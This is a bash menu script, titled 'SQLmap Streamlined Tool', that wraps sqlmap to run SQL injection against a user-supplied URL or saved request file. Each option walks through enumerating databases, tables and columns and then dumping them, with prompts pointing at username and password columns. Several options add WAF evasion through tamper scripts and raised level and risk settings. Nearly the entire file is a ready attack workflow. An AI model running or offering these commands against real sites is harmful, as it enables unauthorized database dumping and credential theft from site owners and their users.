#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              

exit_script()
{
  ./sql.sh
}

setup()
{
    clear
bash sql-setup.sh 
}

easy()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " Url (http://site.com/.php?id=) :"
read url
python sqlmap.py -u $url --dbs
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -u $url -D $database --tables
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -u $url -D $database -T $tables --columns
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -u $url -D $database -T $tables -C $columns --dump
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

waf()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " Url (http://site.com/.php?id=) :"
read url
python sqlmap.py -u $url --dbs --tamper=between --level=3 --risk=3 
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -u $url -D $database --tables --tamper=between --level=3 --risk=3 
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -u $url -D $database -T $tables --columns --tamper=between --level=3 --risk=3 
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -u $url -D $database -T $tables -C $columns --dump --tamper=between --level=3 --risk=3 
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

you()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " Url (http://site.com/.php?id=) :"
read url
echo "  "
echo " Tamper (randomcase,between) :"
read tamper
echo "  "
echo " Level (1,2,3,4,5) :"
read level
echo "  "
echo " Risk (1,2,3) :"
read risk
python sqlmap.py -u $url --dbs --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -u $url -D $database --tables --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -u $url -D $database -T $tables --columns --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -u $url -D $database -T $tables -C $columns --dump --tamper=$tamper --level=$level --risk=$risk
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

filetxt()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " File (sql.txt) :"
read file
python sqlmap.py -r $file --dbs
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -r $file -D $database --tables
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -r $file -D $database -T $tables --columns
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -r $file -D $database -T $tables -C $columns --dump
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

filetxt2()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " File (sql.txt) :"
read file
python sqlmap.py -r $file --dbs --tamper=between --level=3 --risk=3 
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -r $file -D $database --tables --tamper=between --level=3 --risk=3 
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -r $file -D $database -T $tables --columns --tamper=between --level=3 --risk=3 
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -r $file -D $database -T $tables -C $columns --dump --tamper=between --level=3 --risk=3 
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

filetxt3()
{
    clear
echo "  "
echo "  "
echo " you only need to type the site you will  "
echo " test for vulnerability and press enter "
echo "  "
echo "  "
echo " File (sql.txt) :"
read file
echo "  "
echo " Tamper (randomcase,between) :"
read tamper
echo "  "
echo " Level (1,2,3,4,5) :"
read level
echo "  "
echo " Risk (1,2,3) :"
read risk
python sqlmap.py -r $file --dbs --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Database (information_schema) : "
echo "  "
read database
python sqlmap.py -r $file -D $database --tables --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Tables (userlist) : "
echo "  "
read tables
python sqlmap.py -r $file -D $database -T $tables --columns --tamper=$tamper --level=$level --risk=$risk 
echo "  "
echo " Columns (username,password vs. vs.) : "
echo "  "
read columns
python sqlmap.py -r $file -D $database -T $tables -C $columns --dump --tamper=$tamper --level=$level --risk=$risk
echo " " 
echo " " 
echo " Your vulnerability process is finished, if you have received some errors, 
 you can return to the main menu and apply the vulnerability with the appropriate parameters for the error you received. 
 press enter. "
read enter
}

exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear
    echo -e " "  
    echo -e " "  
    echo -e "${WHITE} SQLmap Streamlined Tool ${WHITE}"
    echo -e " "  
    echo -e " "  
    echo -e "   1. SQLmap Setup "  
    echo -e "   2. SQLmap Database Dumped ( Very Easy, Not Waf )"  
    echo -e "   3. SQLmap Database Dumped ( Waf, tamper, level-3, risk-3 )  "  
    echo -e "   4. SQLmap Database Dumped ( Waf, you choose(tamper,level,risk) )  "  
    echo -e "   5. SQLmap File extension .txt ( Very Easy, Not Waf )"  
    echo -e "   6. SQLmap File extension .txt ( Waf, tamper, level-3, risk-3 )  "  
    echo -e "   7. SQLmap File extension .txt ( Waf, you choose(tamper,level,risk) )  "  
    echo -e " "  
    echo -e " "  
    echo -n " which parameter will you use? [1 - 4] "
    read yourch                                          
    case $yourch in
      1) setup ;;
      2) easy ;;
      3) waf ;;
	  4) you ;;
	  5) filetxt ;;
	  6) filetxt2 ;;
	  7) filetxt3 ;;
      ex) echo " as you Command" ;  exit 1  ;;
      *) echo " you entered the wrong number " ;
         echo " you can return to the menu by pressing enter." ; read ;;
 esac
done 
}

trap exit_script 2

Take_input1